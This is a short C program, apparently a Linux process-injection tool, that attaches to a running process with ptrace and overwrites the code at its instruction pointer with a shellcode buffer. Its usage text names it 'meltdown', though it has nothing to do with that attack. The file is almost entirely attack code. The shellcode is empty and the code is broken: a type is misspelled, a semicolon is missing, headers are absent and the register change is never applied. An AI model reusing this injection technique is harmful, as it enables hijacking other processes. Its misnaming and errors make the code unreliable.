#include <stdio.h>
#include <stdlib.h>

#define SHELLCODE_SIZE 32

usigned char *shellcode =
    "";

int inject_code(pid_t pid, unsigned char *src, void *dst, int len) {
    int i;
    uint32_t *s = (uint32_t *)src;
    uint32_t *d = (uint32_t *)dst;
    for (i = 0; i < len; i += 4, s++, d++) {
        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
            perror("ptrace(POKETEXT):");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char *argv[]) 
{
    pid_t target;
    struct user_regs_struct regs;
    int syscall;
    long dst;
  
    if (argc < 2) {
        fprintf(stderr, "Usage: meltdown <pid>\n");
        exit(1);
    }
    target = atoi(argv[1]);
    printf("[*] Tracing process %d...\n", target);
    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
        perror("ptrace(ATTACH):");
        exit(1)
    }
    printf("[*] Waiting for process...\n");
    wait(NULL);
    printf("[*] Getting registers...\n");
    if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(1);
    }
    printf("[*] Injecting shellcode to %p\n", (void *)regs.rip);
    inject_code(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
    regs.rip += 2;
    return 0;
}
